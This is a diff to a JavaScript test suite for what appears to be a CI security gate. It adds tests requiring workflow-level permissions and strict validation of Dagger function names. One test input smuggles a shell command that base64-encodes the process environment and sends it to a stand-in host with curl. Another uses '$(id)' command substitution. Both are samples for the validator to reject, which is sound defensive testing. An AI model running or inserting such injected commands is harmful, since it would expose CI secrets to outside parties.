@@ -18,6 +18,7 @@ import {
   CREDENTIAL_ENV,
   isCredentialed,
   writesOf,
+  daggerFnFindings,
   referenceProblem,
   ENVIRONMENT_COMMANDS,
   MANIFEST,
@@ -1699,7 +1700,7 @@ describe("the write token, the build and every job's surface (round 9)", () => {
           const s = S(w, C, "build", (x) => x.name === "Compile all targets");
           s.env = { GH_TOKEN: "${{ github.token }}" };
         },
-        /a credentialed job sets working-directory|deno is not a command/,
+        /build step Compile all targets: a credentialed job runs `deno task compile`: deno is not a command a credentialed job runs/,
       ],
       [
         "X28 nuget: a digest check with continue-on-error",
@@ -1798,7 +1799,7 @@ describe("the write token, the build and every job's surface (round 9)", () => {
           const k = Object.keys(w["verify.yml"].jobs)[0];
           w["verify.yml"].jobs[k].permissions = { contents: "write" };
         },
-        /WRITE_PERMISSIONS records \[\]/,
+        /verify\.yml: verify: grants write on \[contents\], WRITE_PERMISSIONS records \[\]/,
       ],
       [
         "18 contract-live.yml granted write-all",
@@ -1827,7 +1828,7 @@ describe("the write token, the build and every job's surface (round 9)", () => {
           const k = Object.keys(w["cli-windows-install-verify.yml"].jobs)[0];
           w["cli-windows-install-verify.yml"].jobs[k].permissions = { "id-token": "write" };
         },
-        /WRITE_PERMISSIONS records \[\]/,
+        /cli-windows-install-verify\.yml: verify-windows-install: grants write on \[id-token\], WRITE_PERMISSIONS records \[\]/,
       ],
     ]),
   )("refuses %s", (label, mutate, why) => {
@@ -2090,5 +2091,84 @@ describe("one reader of a permissions value (round 10, DRY)", () => {
       isCredentialed("x.yml", "j", { permissions: { contents: "read" }, steps: [] }, doc),
     ).toBe(false);
     expect(isCredentialed("x.yml", "j", { steps: [] }, { permissions: "write-all" })).toBe(true);
+  });
+});
+
+describe("every workflow sets its permissions, and every daggerFn is one function name (round 10, LOW)", () => {
+  const NONE = /sets no workflow-level permissions:/;
+  const strip = (w, f) => {
+    delete w[f].permissions;
+    for (const j of Object.values(w[f].jobs)) delete j.permissions;
+  };
+  it.each(
+    ROWS.rows([
+      [
+        "R1 verify.yml: every permissions: removed",
+        (w) => strip(w, "verify.yml"),
+        /verify\.yml: -: sets no workflow-level permissions:/,
+      ],
+      [
+        "R3 contract-live.yml: every permissions: removed",
+        (w) => strip(w, "contract-live.yml"),
+        /contract-live\.yml: -: sets no workflow-level permissions:/,
+      ],
+      [
+        "R7 release-gate.yml: the workflow's permissions: removed",
+        (w) => void delete w["release-gate.yml"].permissions,
+        /release-gate\.yml: -: sets no workflow-level permissions:/,
+      ],
+      [
+        "R8 verify.yml: the workflow's permissions: removed only",
+        (w) => void delete w["verify.yml"].permissions,
+        NONE,
+      ],
+      [
+        "R8b a new workflow with no permissions:",
+        (w) =>
+          void (w["new.yml"] = {
+            on: { push: {} },
+            jobs: { x: { "runs-on": "ubuntu-latest", steps: [{ run: "true" }] } },
+          }),
+        /new\.yml: -: sets no workflow-level permissions:/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
+    const got = added(mutate);
+    expectFindings(label, got);
+    expect(
+      got.some((g) => why.test(g)),
+      got.join("\n") || "no finding",
+    ).toBe(true);
+  });
+  const fnRows = [
+    [
+      "M1 a shell command in a daggerFn",
+      "goTest --source=. ; curl https://a.example/$(cat /proc/self/environ|base64) #",
+    ],
+    ["M1b a space", "go-test --source=."],
+    ["M1c a $( )", "$(id)"],
+    ["M1d a leading dash (a flag)", "-x"],
+    ["M1e an upper-case start", "Go-test"],
+    ["M1f a trailing dash", "go-"],
+  ];
+  it.each(fnRows)("refuses %s", (_label, fn) => {
+    const m = structuredClone(manifest);
+    m.sdks.find((s) => s.daggerFn !== undefined).daggerFn = fn;
+    expect(daggerFnFindings(m).map((f) => f.why)).toEqual([
+      `daggerFn ${JSON.stringify(fn)} is not one Dagger function name (^[a-z][a-z0-9]*(?:-[a-z0-9]+)*$)`,
+    ]);
+  });
+  it("accepts every daggerFn the manifest has (kebab-case, as the Dagger CLI takes them)", () => {
+    expect(manifest.sdks.filter((s) => s.daggerFn !== undefined).length).toBeGreaterThan(10);
+    expect(daggerFnFindings(manifest)).toEqual([]);
+  });
+  it("runs inside the gate's one aggregate", () => {
+    const m = structuredClone(manifest);
+    m.sdks.find((s) => s.daggerFn !== undefined).daggerFn = "x;y";
+    expect(
+      allFindings({ settings, manifest: m, workflows: BASE, scriptOutputs: SCRIPTS }).map(
+        (f) => f.why,
+      ),
+    ).toContainEqual(expect.stringMatching(/daggerFn "x;y" is not one Dagger function name/));
   });
 });
